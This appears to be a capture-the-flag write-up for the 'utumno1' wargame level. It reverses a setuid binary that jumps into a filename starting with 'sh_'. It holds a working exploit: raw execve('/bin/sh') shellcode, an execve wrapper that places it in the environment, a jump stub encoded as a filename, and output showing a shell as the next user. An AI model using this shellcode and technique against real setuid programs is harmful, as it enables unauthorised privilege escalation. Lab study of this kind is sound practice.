@@ -1,0 +1,215 @@
+Fantastic and REALLY confusing (at first) level
+Executing '/utumno/utumno1' does nothing visibly - so lets analyze the binary!
+
+This bin makes use of two function calls that I was unfamiliar with: 
+opendir and readdir (as well as a third, custom function)
+				
+
+The first parts - to openndir - were easy for me to understand and piece together:
+
+			   utumno1.main:1
+		 ________________________________
+		| mov eax, dword [envp]		 |
+		| add eax, 4			 |
+		| mov eax, dword [eax]		 |
+		| test eax, eax			 |
+	     ┌─<| jne 0x80484be			 | ;exit if argc < 1
+	     │  | push 1			 |
+	     │  | call sym.imp.exit		 |
+	     └─>| mov eax, dword [envp]		 |
+		| add eax, 4			 |
+		| mov eax, dword [eax]		 |
+		| push eax			 |
+		| call sym.imp.opendir		 |
+		| add esp, 4			 |
+		| mov dword [var_4h], eax	 |
+		| cmp dword [var_4h], 0		 |
+	     ┌─<| jne 0x804850b			 | ;exit if opendir fails 
+	     │ 	| push 1			 |
+	     │ 	| call sym.imp.exit		 |
+	     │  |________________________________|
+
+After setting up the stack and arguments, it checks if argc is < 1 (exiting if so)
+If there are one or more arguments, it uses argv[1] as an argument for 'opendir'.
+
+Essentially this means that I have to run utumno1 with a valid dir as an argument, otherwise
+it exits.
+
+That's easy enough to do - just create a readable directory anywhere and pass the path to it
+as an argument:
+	_________________________________
+	λ ~/ mkdir /tmp/tald1
+	λ ~/ /utumno/utumno1 "/tmp/tald1"
+	_________________________________
+
+The next portions of the bin are what confused me: readdir and 'run'
+		  utumno1.main:2
+	  _____________________________________
+     ┌──>| mov eax, dword [var_8h]	       | ; var_8h is the struct pointer returned by readdir
+     ╎│  | add eax, 0xb		       	       | ; the offset to the 'd_name' member is 11
+     ╎│  | push 3			       | ; arg3 for strncmp, num of chars to compare
+     ╎│  | push eax		       	       | ; arg2 for strncmp, 2nd string to compare
+     ╎│  | push 0x80485b0		       | ; arg1 for strncmp, 1st string to compare
+     ╎│  | call sym.imp.strncmp	       	       | ; strncmp("sh_", var_8h->d_name, 3); 
+     ╎│  | add esp, 0xc		       	       |
+     ╎│  | test eax, eax		       | 
+    ┌───<| jne 0x804850b		       | ; strncmp returns 0 if equal, so this jumps if they're not eq
+    │╎│  | mov eax, dword [var_8h]	       | ; reset pointer to struct
+    │╎│  | add eax, 0xb		       	       | 
+    │╎│  | add eax, 3		       	       | ; eax now points to the 4th character and on in the filename
+    │╎│  | push eax		       	       |
+    │╎│  | call dbg.run		       	       | ; calls custom 'run' function with the address/string in eax
+    │╎│  | add esp, 4		       	       | ; as the argument
+    └─└─>| push dword [var_4h]	       	       |
+	 | call sym.imp.readdir	       	       | ; if the strncmp didn't succeed, it reads the next file in the dir
+	 | add esp, 4		       	       | ; this behavior continues until 'run' is called, or there are no more
+	 | mov dword [var_8h], eax	       | ; files, upon which it exits
+	 | cmp dword [var_8h], 0	       |
+	 | jne 0x80484df		       |
+	 |_____________________________________|
+
+
+This portion of the asm gave me a lot of trouble at first, because I did not understand what readdir did.
+
+From the manpage for readdir:
+__________________________________________________________________________
+"The  readdir() function returns a pointer to a dirent structure..."
+
+   struct dirent {
+       ino_t          d_ino;       /* Inode number */
+       off_t          d_off;       /* Not an offset; see below */
+       unsigned short d_reclen;    /* Length of this record */
+       unsigned char  d_type;      /* Type of file; not supported
+                                      by all filesystem types */
+       char           d_name[256]; /* Null-terminated filename */
+   };
+__________________________________________________________________________
+
+At this point I was running '/utumno/utumno1 exampledir', where exampledir
+contained random files -- but I didn't know what the strncmp was checking
+until I could figure out what the offset 0xb was.
+
+To learn more about readdir, I wrote this:
+
+			dirread.c
+  __________________________________________________________ 
+ | #include <stdio.h>                                       |
+ | #include <sys/types.h>                                   | 
+ | #include <dirent.h>                                      | 
+ | #include <stdlib.h>                                      | 
+ |                                                          | 
+ | int main(int argc, char *argv[]){                        | 
+ | 	DIR *dir;                                           | 
+ | 	struct dirent *rd;                                  | 
+ | 	if(argc < 2){                                       | 
+ | 		puts("Usage: ./test DIR");                  | 
+ | 		exit(1);                                    | 
+ | 	}                                                   | 
+ | 	printf("Trying to open: %s\n", argv[1]);            | 
+ | 	dir = opendir(argv[1]);                             |
+ | 	if(dir == NULL){                                    | 
+ | 		perror("ERROR: opendir returned NULL");     | 
+ | 		exit(1);                                    | 
+ | 	}                                                   | 
+ | 	printf("%s\n", argv[1]);                            | 
+ | 	printf("size rd: %lu\n", sizeof(*rd));              | 
+ | 	while((rd = readdir(dir)) != NULL){                 | //run while 'dir' has new files
+ | 		printf("|__ %s\n", rd->d_name);             | //print filename
+ | 	}                                                   | 
+ | 	closedir(dir);                                      | 
+ | 	return 0;                                           | 
+ | }                                                        | 
+ |__________________________________________________________|
+
+Decompiling this confirmed that '0xb' was the offset for d_name,
+so I knew strncmp was looking for a file in the directory provided
+where the first 3 characters of the filename were 'sh_'... at which 
+it would call 'run'
+
+			decompiled 'run'
+	 ___________________________________________
+	| run:                                      |
+	| void* const* var_8 = &__return_addr       |
+	| *var_8 = arg1                             |
+	| return var_8                              |
+	|___________________________________________|
+
+The assembly for 'run' is longer/more confusing than it really is...
+it takes in a string pointer, and returns TO the string pointer.
+What this means for us -- if that string contains shellcode, it'll
+execute it!!
+
+On top of that, run is called when a filename starts with 'sh_'.
+But the parameter passed to run() is the 3rd characters and on in the
+filename.
+If we create a file with shellcode in its name, place it inside of a dir 'dir',
+and run '/utumno/utumno1 dir', theoretically the shellcode should execute!
+
+There are only a few hitches in this plan:
+ - filenames can't use some characters... (/bin/sh...)
+ - struct data is created in the heap, which is NOT executable
+
+Fortunately, the 2nd problem is taken care of in the server - the heap is executable there.
+The first one can be solved several ways, but I took the approach of using a tiny tiny piece of shellcode
+to jump to my shellcode in the stack, placed through environment variables.
+			
+Wrapper for predictable shellcode location in environment:
+
+					u1wrapper.c
+  ______________________________________________________________________________________
+ | #include <unistd.h>                                                                  |
+ |                                                                                      |
+ | //0xffffdfbf is location of shellcode in env                                         |
+ | int main(void) {                                                                     |
+ | 	char *environment[2] = {"SHELLCODE=\x50\xd4\xff\xff\x31\xc0\x31\xdb             |
+ | 	\x31\xc9\x31\xd2\x89\xe5\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62            |
+ | 	\x69\x6e\x8d\x0c\x24\x31\xc0\x50\x51\x8b\x1c\x24\x89\xe1\xb0\x0b\xcd\x80", 0};  |
+ | 	char *argv[3] = {"/utumno/utumno1", "/tmp/tald1", 0};                           |
+ | 	execve("/utumno/utumno1", argv, environment);                                   |
+ | }                                                                                    |
+ |______________________________________________________________________________________|
+
+ Analyzing that binary, I found the location of the shellcode on the stack to be 0xffffdfbf.
+
+ Now I find the bytes for this assembly:
+  ___________________________________
+ | global _start                     |
+ | _start:                           |
+ | 	mov eax, 0xffffdfbf          |
+ | 	jmp eax                      |
+ |___________________________________|
+
+Which are:
+	\xb8\xbf\xdf\xff\xff\xff\xe0
+
+The last step should be to create a file with those bytes in it's name, so
+
+	      shellcode.py
+______________________________________
+#!/bin/python2
+print(b'\xb8\xbf\xdf\xff\xff\xff\xe0')
+______________________________________
+
+Using touch with python to create the file:
+_____________________________________________
+λ ~/exampledir/ touch "sh_$(../shellcode.py)"
+λ ~/exampledir/ ls
+'sh_'$'\270\277\337\377\377\377\340'
+_____________________________________________
+
+Combining the steps on the server:
+ - make a dir in /tmp
+ - create the sh_ file in it
+ - run the wrapper program with the proper argv
+ - GET A SHELL!!!!
+
+________________________________________________
+utumno1@utumno:/tmp/tald1$ ls
+sh_???????  shellcode.py  u1wrapper  u1wrapper.c
+utumno1@utumno:/tmp/tald1$ ./u1wrapper
+$ whoami
+utumno2
+$
+________________________________________________
+
+YAYYY!
